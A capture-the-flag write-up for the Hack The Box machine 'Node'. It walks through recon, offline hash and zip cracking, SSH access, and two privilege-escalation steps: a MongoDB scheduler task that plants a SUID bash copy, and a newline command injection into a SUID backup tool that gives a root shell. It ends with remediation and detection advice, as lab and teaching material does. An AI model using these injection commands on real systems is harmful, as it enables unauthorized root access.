# Node — HTB Medium, Linux

**By d4rkgunn3r / Dylan Senez — Authorized laboratory assessment**

**Attack path:** unauthenticated user API → offline hash cracking → admin backup download → source-code credential discovery → SSH as `mark` → MongoDB scheduler command injection → `tom` / admin-group context → SUID backup command injection → root

> **Colour key:** **ATTACKER** blocks run on your host. **TARGET** blocks run inside the HTB machine once you have a shell.

### Reproducibility notes

- Passwords, database credentials, the privileged backup key, and flag contents are redacted.
- The private notes preserve the exploitation commands used for the scheduler and SUID backup stages.

---

## 02 — Scope

| Field | Detail |
| --- | --- |
| Machine | Node / HTB, Medium, Linux |
| Target IP (recorded run) | `10.129.49.55` |
| Starting access | Unauthenticated |
| Confirmed services | SSH/22, MyPlace web app/3000 |
| Objective | Obtain user and root proof in the authorized HTB lab |

## 03 — External recon

**ATTACKER**

```bash
nmap -sV -sC -p- 10.129.49.55 -T4 --min-rate 5000
```

Key results:

```text
22/tcp    OpenSSH 7.2p2
3000/tcp  HTTP — MyPlace
```

## 04 — User API disclosure

Application enumeration revealed an unauthenticated API that returned user records, including password hashes and role information.

The hashes were processed offline. Recovered plaintext values are omitted from this public copy.

```bash
hashcat -m 1400 hashes.txt /usr/share/wordlists/rockyou.txt --username
```

## 05 — Admin backup extraction

After authenticating with the recovered application credential, the backup function returned a base64-encoded, password-protected archive.

```bash
base64 -d 'myplace(1).backup' > backup.zip
fcrackzip -D -p /usr/share/wordlists/rockyou.txt -u backup.zip
unzip -P '<REDACTED>' backup.zip
```

Application source code in the backup exposed MongoDB credentials for the local user `mark`. The password is omitted.

## 06 — SSH as mark

**ATTACKER**

```bash
ssh mark@10.129.49.55
```

**TARGET**

```bash
whoami
id
find / -perm -4000 -type f 2>/dev/null
```

Enumeration identified `/usr/local/bin/backup`.

## 07 — MongoDB scheduler → tom

**TARGET**

```bash
mongo -u mark -p '<REDACTED>' scheduler
```

```javascript
show collections
db.tasks.find()
db.tasks.insert({"cmd":"/bin/cp /bin/bash /tmp/tom; /bin/chown tom:admin /tmp/tom; chmod g+s /tmp/tom; chmod u+s /tmp/tom"});
```

After the scheduler executed the task:

```bash
/tmp/tom -p
whoami
id
```

This moved execution into the `tom` account with the group membership required to execute the privileged backup utility.

## 08 — SUID backup command injection → root

**TARGET**

```bash
/usr/local/bin/backup -q '<REDACTED_KEY>' $'\n/bin/bash\n'
whoami
id
```

Successful exploitation produced a root shell.

## 09 — Proof

```bash
cat /root/root.txt
```

The private evidence also retains user-level proof. Flag values are omitted.

## 10 — Vulnerability summary & remediation

| # | Finding | Asset | Rating |
| --- | --- | --- | --- |
| 1 | Unauthenticated API exposes user hashes and role data | MyPlace API | Critical |
| 2 | Weakly protected backup exposes source and secrets | Backup feature | High |
| 3 | Scheduler accepts attacker-controlled system commands | MongoDB scheduler | Critical |
| 4 | SUID backup utility is vulnerable to OS command injection | `/usr/local/bin/backup` | Critical |

### Remediations

- Require authentication and role authorization on user-data APIs.
- Never return password hashes to clients.
- Use a modern adaptive KDF such as Argon2id or bcrypt.
- Remove secrets from source code and rotate exposed database credentials.
- Require authenticated, authorized task creation and avoid raw shell commands in schedulers.
- Remove the SUID bit from the backup utility and replace shell-based execution with safe process APIs.

## 11 — Detection opportunities

- Bulk access to user API records without a session.
- Backup download immediately followed by SSH authentication.
- Scheduler tasks containing shell metacharacters.
- Creation of SUID/SGID files under `/tmp`.
- Invocation of `/usr/local/bin/backup` with newline or shell-control characters.

## 12 — Timeline

1. Nmap identified SSH and MyPlace on 3000.
2. API enumeration exposed user hashes.
3. Offline cracking yielded application access.
4. Admin backup disclosed source code and MongoDB credentials.
5. SSH access was obtained as `mark`.
6. Scheduler task injection moved execution to `tom`.
7. SUID backup command injection produced root.
8. Root proof was collected.

**Publication note:** credentials, privileged keys, and flag values have been removed from this shared copy.
